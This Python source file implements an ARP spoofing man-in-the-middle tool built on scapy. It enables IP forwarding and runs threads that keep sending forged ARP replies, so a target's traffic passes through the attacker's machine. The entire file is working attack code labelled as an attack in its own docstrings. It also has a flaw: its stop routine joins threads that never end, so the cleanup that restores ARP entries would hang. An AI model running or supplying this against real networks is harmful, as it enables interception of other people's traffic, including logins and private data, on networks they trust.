import time
import threading
import subprocess
from scapy.all import *

from network_modules.helpers.colors import (
    TextColors,
)  # Assuming your existing colors module


class TrafficInterceptor:
    def __init__(self, target_ip, verbose=True):
        self.target_ip = target_ip
        self.gateway_ip = self.get_default_gateway()
        self.target_mac = self.get_mac(self.target_ip)
        self.gateway_mac = self.get_mac(self.gateway_ip)
        self.verbose = verbose
        self.poison_threads = []
        self.restore_thread = None

        if not (self.target_mac and self.gateway_mac):
            raise ValueError("Failed to resolve target or gateway MAC address.")

    def get_default_gateway(self):
        """Retrieve the default gateway IP address."""
        try:
            output = subprocess.check_output(
                ["ip", "route", "show", "default"]
            ).decode()
            gateway_ip = output.split("via")[1].split()[0]
            self.print_status(f"Gateway IP: {gateway_ip}")
            return gateway_ip
        except Exception as e:
            self.print_error(f"Error getting default gateway: {e}")
            return None

    def get_mac(self, ip_address):
        """Retrieve the MAC address for a given IP address."""
        try:
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address),
                timeout=2,
                verbose=0,
            )
            if ans:
                return ans[0][1].hwsrc
            else:
                self.print_error(f"Failed to resolve MAC address for {ip_address}")
                return None
        except Exception as e:
            self.print_error(f"Error getting MAC address: {e}")
            return None

    def poison_target(self):
        """Continuously send ARP spoofing packets to the target."""
        try:
            while True:
                packet = ARP(
                    op=2,
                    pdst=self.target_ip,
                    hwdst=self.target_mac,
                    psrc=self.gateway_ip,
                )
                send(packet, verbose=0)
                time.sleep(2)
        except Exception as e:
            self.print_error(f"Error poisoning target: {e}")

    def poison_gateway(self):
        """Continuously send ARP spoofing packets to the gateway."""
        try:
            while True:
                packet = ARP(
                    op=2,
                    pdst=self.gateway_ip,
                    hwdst=self.gateway_mac,
                    psrc=self.target_ip,
                )
                send(packet, verbose=0)
                time.sleep(2)
        except Exception as e:
            self.print_error(f"Error poisoning gateway: {e}")

    def restore(self):
        """Restore the original ARP entries."""
        try:
            self.print_status("Restoring ARP entries...")
            send(
                ARP(
                    op=2,
                    pdst=self.gateway_ip,
                    hwdst=self.gateway_mac,
                    psrc=self.target_ip,
                    hwsrc=self.target_mac,
                ),
                count=5,
                verbose=0,
            )
            send(
                ARP(
                    op=2,
                    pdst=self.target_ip,
                    hwdst=self.target_mac,
                    psrc=self.gateway_ip,
                    hwsrc=self.gateway_mac,
                ),
                count=5,
                verbose=0,
            )
            self.print_status("ARP entries restored.")
        except Exception as e:
            self.print_error(f"Error restoring ARP entries: {e}")

    def start(self):
        """Start the ARP spoofing attack."""
        try:
            self.print_status("Enabling IP forwarding...")
            subprocess.check_output(["sysctl", "-w", "net.ipv4.ip_forward=1"])

            self.print_status("Starting ARP spoofing...")
            self.poison_threads.append(
                threading.Thread(target=self.poison_target, daemon=True)
            )
            self.poison_threads.append(
                threading.Thread(target=self.poison_gateway, daemon=True)
            )
            for thread in self.poison_threads:
                thread.start()

            self.print_status(f"Traffic from {self.target_ip} is now being rerouted!")

        except Exception as e:
            self.print_error(f"Error starting ARP spoofing: {e}")

    def stop(self):
        """Stop the ARP spoofing attack and restore ARP entries."""
        try:
            self.print_status("Stopping ARP spoofing...")
            for thread in self.poison_threads:
                thread.join()

            self.restore_thread = threading.Thread(target=self.restore, daemon=True)
            self.restore_thread.start()
            self.restore_thread.join()

            self.print_status("Disabling IP forwarding...")
            subprocess.check_output(["sysctl", "-w", "net.ipv4.ip_forward=0"])

            self.print_status("Traffic rerouting stopped.")
        except Exception as e:
            self.print_error(f"Error stopping ARP spoofing: {e}")

    def print_status(self, message):
        """Print status messages to the console."""
        if self.verbose:
            print(f"{TextColors.OKGREEN}[+] {message}{TextColors.ENDC}")

    def print_error(self, message):
        """Print error messages to the console."""
        if self.verbose:
            print(f"{TextColors.FAIL}[!] {message}{TextColors.ENDC}")
